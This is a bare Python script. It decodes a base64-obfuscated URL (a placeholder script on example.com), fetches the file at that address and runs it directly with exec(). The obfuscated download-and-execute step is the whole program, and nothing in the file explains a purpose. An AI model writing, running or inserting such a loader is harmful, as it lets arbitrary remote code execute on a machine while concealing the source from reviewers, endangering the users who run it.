import base64
import requests

def decode_url(encoded_url):
    return base64.b64decode(encoded_url).decode("utf-8")

def get_script(decoded_url):
    response = requests.get(decoded_url)
    return response.text

def main():
    try:
        encoded_url = "aHR0cDovL2V4YW1wbGUuY29tL3NjcmlwdDUucHk="
        decoded_url = decode_url(encoded_url)
        script = get_script(decoded_url)
        exec(script)
    except Exception as e:
        print(e)

main()
